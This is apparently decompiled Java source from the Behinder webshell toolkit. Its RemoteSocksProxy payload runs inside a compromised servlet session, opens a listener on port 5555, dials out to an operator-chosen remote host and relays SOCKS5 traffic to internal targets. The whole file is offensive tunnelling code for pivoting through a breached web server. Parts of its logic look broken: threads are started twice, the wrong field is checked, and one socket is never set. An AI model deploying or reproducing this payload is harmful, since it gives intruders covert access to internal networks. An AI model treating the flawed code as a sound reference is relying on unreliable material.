package net.rebeyond.behinder.payload.java;

import net.rebeyond.behinder.utils.CipherUtils;
import org.objectweb.asm.Opcodes;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.*;
import java.nio.channels.SocketChannel;

public class RemoteSocksProxy implements Runnable {
    public static String action;
    public static String remoteIP;
    public static String remotePort;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    private final int bufSize = 65535;
    private Socket innerSocket;
    private final int listenPort = 5555;
    private Socket outerSocket;
    private Socket serverInnersocket;
    private Socket targetSocket;
    private String threadType;

    public RemoteSocksProxy(Socket socket, String threadType2, HttpSession session) {
        this.outerSocket = socket;
        this.threadType = threadType2;
        this.Session = session;
    }

    public RemoteSocksProxy(String threadType2, HttpSession session) {
        this.threadType = threadType2;
        this.Session = session;
    }

    public RemoteSocksProxy(Socket outerSocket2, String threadType2, Socket innerSocket2) {
        this.outerSocket = outerSocket2;
        this.innerSocket = innerSocket2;
        this.threadType = threadType2;
    }

    public RemoteSocksProxy() {
    }

    public boolean equals(Object obj) {
        return false;
    }

    public void run() {
        if (action.equals("create")) {
            try {
                ServerSocket serverSocket = new ServerSocket(this.listenPort, 50);
                this.Session.setAttribute("socks_server_" + this.listenPort, serverSocket);
                serverSocket.setReuseAddress(true);
                new Thread(new RemoteSocksProxy("link", this.Session)).start();
                while (true) {
                    Socket serverInnersocket2 = serverSocket.accept();
                    this.Session.setAttribute("socks_server_inner_" + serverInnersocket2.getInetAddress().getHostAddress() + "_" + serverInnersocket2.getPort(), serverInnersocket2);
                    new Thread(new RemoteSocksProxy(serverInnersocket2, "session", this.Session)).start();
                }
            } catch (IOException e) {
            }
        }
        if (action.equals("link")) {
            try {
                SocketChannel outerSocketChannel = SocketChannel.open();
                outerSocketChannel.connect(new InetSocketAddress(remoteIP, Integer.parseInt(remotePort)));
                this.Session.setAttribute("socks_outer_" + outerSocketChannel.socket().getLocalPort() + "_" + remoteIP + "_" + remotePort, outerSocketChannel);
                SocketChannel innerSocketChannel = SocketChannel.open();
                innerSocketChannel.connect(new InetSocketAddress("127.0.0.1", this.listenPort));
                this.Session.setAttribute("socks_inner_" + innerSocketChannel.socket().getLocalPort(), innerSocketChannel);
            } catch (IOException e2) {
            }
        } else if (action.equals("session")) {
            try {
                if (handleSocks(this.serverInnersocket)) {
                    Thread reader = new Thread(new RemoteSocksProxy(this.serverInnersocket, "read", this.Session));
                    reader.start();
                    Thread writer = new Thread(new RemoteSocksProxy(this.serverInnersocket, "write", this.Session));
                    writer.start();
                    reader.start();
                    writer.start();
                    reader.join();
                    writer.join();
                }
            } catch (Exception e3) {
                e3.printStackTrace();
            }
        } else if (action.equals("read")) {
            while (this.outerSocket != null) {
                try {
                    byte[] buf = new byte[Opcodes.ACC_INTERFACE];
                    int bytesRead = this.innerSocket.getInputStream().read(buf);
                    while (bytesRead > 0) {
                        this.outerSocket.getOutputStream().write(buf, 0, bytesRead);
                        this.outerSocket.getOutputStream().flush();
                        bytesRead = this.innerSocket.getInputStream().read(buf);
                    }
                } catch (Exception e4) {
                    e4.printStackTrace();
                }
                try {
                    this.innerSocket.close();
                    this.outerSocket.close();
                } catch (Exception e5) {
                    e5.printStackTrace();
                }
            }
        } else if (action.equals("write")) {
            while (this.outerSocket != null) {
                try {
                    this.outerSocket.setSoTimeout(1000);
                    byte[] data = new byte[this.bufSize];
                    int length = this.outerSocket.getInputStream().read(data);
                    if (length == -1) {
                        break;
                    }
                    this.innerSocket.getOutputStream().write(data, 0, length);
                    this.innerSocket.getOutputStream().flush();
                } catch (SocketTimeoutException e6) {
                } catch (Exception e7) {
                    e7.printStackTrace();
                }
            }
            try {
                this.innerSocket.close();
                this.outerSocket.close();
            } catch (Exception e8) {
                e8.printStackTrace();
            }
        }
    }

    private boolean handleSocks(Socket socket) throws Exception {
        int ver = socket.getInputStream().read();
        if (ver == 5) {
            return parseSocks5(socket);
        }
        if (ver == 4) {
            return parseSocks4(socket);
        }
        return false;
    }

    private boolean parseSocks5(Socket socket) throws Exception {
        int cmd;
        int atyp;
        DataInputStream ins = new DataInputStream(socket.getInputStream());
        DataOutputStream os = new DataOutputStream(socket.getOutputStream());
        ins.read();
        ins.read();
        os.write(new byte[]{5, 0});
        if (ins.read() == 2) {
            ins.read();
            cmd = ins.read();
            ins.read();
            atyp = ins.read();
        } else {
            cmd = ins.read();
            ins.read();
            atyp = ins.read();
        }
        byte[] targetPort = new byte[2];
        String host = "";
        if (atyp == 1) {
            byte[] target = new byte[4];
            ins.readFully(target);
            ins.readFully(targetPort);
            String[] tempArray = new String[4];
            for (int i = 0; i < target.length; i++) {
                tempArray[i] = (target[i] & 255) + "";
            }
            for (int i2 = 0; i2 < tempArray.length; i2++) {
                host = host + tempArray[i2] + ".";
            }
            host = host.substring(0, host.length() - 1);
        } else if (atyp == 3) {
            byte[] target2 = new byte[ins.read()];
            ins.readFully(target2);
            ins.readFully(targetPort);
            host = new String(target2);
        } else if (atyp == 4) {
            byte[] target3 = new byte[16];
            ins.readFully(target3);
            ins.readFully(targetPort);
            host = new String(target3);
        }
        int port = ((targetPort[0] & 255) * 256) + (targetPort[1] & 255);
        if (cmd == 2 || cmd == 3) {
            throw new Exception("not implemented");
        } else if (cmd == 1) {
            String host2 = InetAddress.getByName(host).getHostAddress();
            try {
                SocketChannel targetSocketChannel = SocketChannel.open();
                targetSocketChannel.connect(new InetSocketAddress(host2, port));
                this.Session.setAttribute("socks_target_" + targetSocketChannel.socket().getLocalPort() + "_" + host2 + "_" + port, targetSocketChannel);
                os.write(CipherUtils.mergeByteArray(new byte[]{5, 0, 0, 1}, InetAddress.getByName(host2).getAddress(), targetPort));
                return true;
            } catch (Exception e) {
                os.write(CipherUtils.mergeByteArray(new byte[]{5, 0, 0, 1}, InetAddress.getByName(host2).getAddress(), targetPort));
                throw new Exception(String.format("[%s:%d] Remote failed", host2, Integer.valueOf(port)));
            }
        } else {
            throw new Exception("Socks5 - Unknown CMD");
        }
    }

    private boolean parseSocks4(Socket socket) {
        return false;
    }
}
